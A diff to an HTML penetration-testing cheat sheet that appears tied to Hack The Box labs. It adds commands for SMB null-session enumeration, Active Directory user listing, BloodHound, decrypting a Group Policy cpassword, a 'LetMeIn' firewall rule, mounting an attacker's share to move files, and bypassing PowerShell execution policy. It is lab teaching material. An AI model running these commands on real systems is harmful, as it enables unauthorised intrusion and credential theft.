@@ -146,13 +146,18 @@ nslookup -> set type=any -> ls -d blah.com	#Perform Zone Transfer (windows)
 </pre>
 <p><h3>Are there any NETBIOS, SMB, RPC ports discovered?</h3></p>
 <pre style="background-color:black;color:white;">
-enum4linux -a [IP_ADDRESS] (For more info - https://labs.portcullis.co.uk/tools/enum4linux/)
-rpcclient [IP_ADDRESS] -U “” -N (For more info - https://attackerkb.com/Windows/rpcclient)
+smbmap -H [IP_ADDRESS]	#Map smb shares using null sessions
+
+Example: 
+smbmap -H 10.10.10.100 -s Replication -R Replication	#Recursively list dirs in "Replication" share (HTB Active)
+smbmap -R Replication -A Groups.xml -q -H 10.10.10.100	#Define a file name pattern (regex) that auto downloads the file "Groups.xml" (usually it downloads to /usr/share/smbmap/ dir)
+ 
+rpcclient [IP_ADDRESS] -U “” -N (For more info - https://attackerkb.com/Windows/rpcclient)	#connect to share
 rpcinfo -p [IP_ADDRESS]	(rpcinfo: What services are running?)
-</pre>
-<p><h3>NTLMv2 Discovered?</h3></p>
-<pre style="background-color:black;color:white;">
-Perform a SMB relay - https://cqureacademy.com/blog/penetration-testing/smb-relay-attack
+
+#NTLMv2 Discovered?
+* Check for SMB signing that may prevent this attack - https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/
+* Perform a SMB relay - https://cqureacademy.com/blog/penetration-testing/smb-relay-attack
 </pre>
 <p><font size="3.5" color="black">Is portmapper running? Is rlogin running? Or NFS or Mountd? - http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/</font></p>
 <pre style="background-color:black;color:white;">
@@ -237,6 +242,21 @@ wget --mirror 'ftp://[FTP_USER]:[FTP_USER_PASSWORD]@[DOMAIN_NAME]'	#get all the 
 exiftool [FILE]	#extract file's metadata
 </pre>
 <hr>
+<p><h3>Active Directory stuff</h3></p>
+<pre style="background-color:black;color:white;">
+GetADUsers.py	#get active directory's users (in kali - requires credentials)
+
+Example:
+GetADUsers.py -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+#Bloodhound - https://www.youtube.com/watch?v=lxd2rerVsLo
+Run the ingestors from the compromised windows box.
+
+Examples:
+HTB Reel - https://www.youtube.com/watch?v=ob9SgtFm6_g&t=2122s
+HTB Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1105s	
+</pre>
+<hr>
 <p><h3>Password Cracking / Brute Forcing</h3></p>
 <p><font size="3.5" color="black">Try this as the last resort or in case the Passwd/Shadow/SAM files are in possession:
 For linux, first combine passwd & shadow files:  unshadow [PASSWD_FILE] [SHADOW_FILE] > unshadowed.txt
@@ -251,6 +271,13 @@ medusa -h [IP_ADDRESS] -U [USERNAME_FILE] -P PASSWORD_FILE] -M http -m DIR:/admi
 <pre style="background-color:black;color:white;">
 # Go to - https://hashcat.net/wiki/doku.php?id=example_hashes to know what module to use in hashcat (Generic hash types)
 hashcat -m [MODULE_NUMBER] -a 0 [HASH_FILE] [WORDLIST_FILE]
+</pre>
+<p><font size="3.5" color="black">Encrypted files:</font></p>
+<pre style="background-color:black;color:white;">
+gpp-decrypt	#crack Group Policy Preferences (GPP) password (cpassword entry in Groups.xml file)
+
+Example:
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 </pre>
 <p><font size="3.5" color="black">Compressed files:</font></p>
 <pre style="background-color:black;color:white;">
@@ -380,6 +407,8 @@ PS C:\> Get-NetFirewallRule –all											#List and modify the Windows firewa
 PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress [IP_ADDRESS]				
 PS C:\> New-PSDrive -Name [SHARE_NAME_TO_BE_CREATED_ON_WIN_BOX] -PSProvider FileSystem -Root "\\[ATTACKERS_IP_ADDRESS]\[SHARE_TO_MOUNT]"	#Mount attacker's share on a win machine for moving files (use impacket-smbserver on attacking box - impacket-smbserver [SHARE_NAME] [PATH_TO_SHARE]) 
 PS C:\> Get-Content -Path "hm.txt" -Stream "root.txt"									#Reading the alternate data stream of a file. Example - hm.txt:root.txt:$DATA
+PS C:\> Test-NetConnection -ComputerName [IP_ADDRESS] -Port [Port]	#test connection to a specific port (boolean)
+PS C:\> PowerShell -Exec Bypass												#Bypass execution policy
 </pre>
 </br>
 <pre style="background-color:black;color:white;">
